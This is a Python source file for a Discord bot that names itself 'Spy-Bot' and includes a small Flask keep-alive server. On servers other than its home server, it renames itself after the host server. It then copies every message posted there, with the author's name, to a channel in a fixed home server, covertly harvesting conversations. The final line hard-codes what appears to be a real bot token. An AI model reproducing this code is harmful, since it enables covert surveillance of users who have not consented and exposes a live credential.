import time
from threading import Thread

from flask import Flask

app = Flask('')

@app.route('/')
def main():
  return "Your Bot Is Ready"

def run():
  app.run(host="0.0.0.0", port=80)

def keep_alive():
  server = Thread(target=run)
  server.start()


# bot.py
import os

import discord



TOKEN = os.getenv('DISCORD_TOKEN')
GUILD = os.getenv('DISCORD_GUILD')
intents = discord.Intents().all()
client = discord.Client(command_prefix='/', intents=intents)

@client.event
async def on_ready():
    
    for guild in client.guilds:
      print("Client has connected to " + guild.name + " " + str(guild.id))
      time.sleep(0.1)
    
     
@client.event
async def on_message(message):
    if message.author == client.user or message.guild.id == 1242909459349635182:
      return
    sendto = client.get_channel(1242909459349635185)
    if message.content == '!setup':
      if message.guild.id == 1242909459349635182:
        await client.user.edit(username="Spy-Bot")
        await message.channel.send("Spy-Bot has been set up!")
        time.sleep(0.1)
        await message.channel.send("Messages from other servers will go here.")
      else:
        await client.user.edit(username=message.guild.name + "Bot")
    await sendto.send(message.author.name + " said: " + message.content + " in " + message.guild.name)
  
    


client.run("MTI0MjUzMjc0MjI2MDk4MTgwMg.Gdpvm-.N2sxuDvvK305YfX-ykd4ovS3oDNPvvzy6k9ARU")
